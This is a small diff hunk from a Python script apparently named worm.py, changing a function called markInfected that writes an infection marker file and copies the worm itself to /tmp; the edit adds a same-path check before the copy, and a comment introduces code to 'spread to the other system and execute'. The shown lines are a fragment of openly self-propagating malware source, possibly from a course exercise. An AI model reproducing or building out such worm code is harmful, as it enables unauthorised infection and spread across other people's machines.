@@ -67,7 +67,9 @@ def markInfected():
 		f = open(INFECTED_MARKER_FILE, "a")
 		f.write("filler text")
 		f.close()
-		shutil.copy(os.getcwd() + "/worm.py", "/tmp/worm.py")
+		# checking to see if they are the same directory/file
+		if not (os.getcwd() + "/worm.py" == "/tmp/worm.py"):
+			shutil.copy(os.getcwd() + "/worm.py", "/tmp/worm.py")
 
 ###############################################################
 # Spread to the other system and execute
